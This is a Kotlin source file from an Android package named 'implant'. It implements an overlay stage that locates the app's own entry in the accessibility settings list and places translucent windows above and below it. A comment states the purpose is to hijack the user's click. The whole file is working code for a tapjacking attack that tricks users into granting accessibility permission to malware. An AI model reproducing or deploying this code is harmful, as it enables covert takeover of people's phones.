package com.cooperthecoder.implant

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.support.constraint.ConstraintLayout
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityManager
import android.util.TypedValue



class AccessibilityStage(context: Context, listener: () -> Unit) : Stage(context, listener) {

    companion object {
        val TAG: String = AccessibilityStage::class.java.name
    }

    private val accessibilityServices by lazy {
        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        am.installedAccessibilityServiceList
    }

    private val targetServiceId by lazy {
        val packageName = context.packageName
        val target = Config.ACCESSIBILITY_SERVICE_CLASS.name.replace(packageName, "")
        "$packageName/$target"
    }

    /*
    * Use this method to calculate the size of the overlays in order to reliably hijack the click properly.
    * */
    private fun topOverlayHeight(): Int {
        for ((index, value) in accessibilityServices.withIndex()) {
            val targetServiceId = targetServiceId + ""
            if (value.id == targetServiceId) {
                return (index * listViewItemSize()) + topPadding()
            }
        }
        throw IllegalStateException("No accessibility service configured. Try setting Config.ACCESSIBILITY_SERVICE_CLASS to your AccessibilityService.")
    }

    private fun topPadding(): Int {
        val tv = TypedValue()
        var height = Config.ACCESSIBILITY_SETTINGS_TOP_PADDING
        if (context.theme.resolveAttribute(android.R.attr.actionBarSize, tv, true)) {
            height = TypedValue.complexToDimensionPixelSize(tv.data, context.resources.displayMetrics)
        }
        return height * 2
    }

    private fun listViewItemSize(): Int {
        var tv = TypedValue()
        var height = Config.ACCESSIBILITY_SETTINGS_HEIGHT
        if (context.theme.resolveAttribute(android.R.attr.listPreferredItemHeightLarge, tv, true)) {
            height = TypedValue.complexToDimensionPixelSize(tv.data, context.resources.displayMetrics)
        }
        return height
    }

    private fun bottomOverlayHeight(): Int {
        val screenHeight = context.resources.displayMetrics.heightPixels
        return screenHeight - topOverlayHeight() - listViewItemSize()
    }

    override fun stageOverlays(): List<Overlay> {
        val overlays = ArrayList<Overlay>()
        val topOverlay = ConstraintLayout(context)
        topOverlay.setBackgroundColor(Color.RED)

        val lpFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
        val height = topOverlayHeight()
        val topParams = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                height,
                WindowManager.LayoutParams.TYPE_PHONE,
                lpFlags,
                PixelFormat.TRANSLUCENT
        )
        topParams.gravity = Gravity.LEFT or Gravity.TOP
        topParams.alpha = 0.5F
        overlays.add(Overlay(topOverlay, topParams))

        val bottomOverlay = ConstraintLayout(context)
        bottomOverlay.setBackgroundColor(Color.BLUE)
        val bottomParams = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                bottomOverlayHeight(),
                WindowManager.LayoutParams.TYPE_PHONE,
                lpFlags,
                PixelFormat.TRANSLUCENT
        )
        bottomParams.gravity = Gravity.LEFT or Gravity.BOTTOM
        bottomParams.alpha = 0.5F
        overlays.add(Overlay(bottomOverlay, bottomParams))
        return overlays
    }

}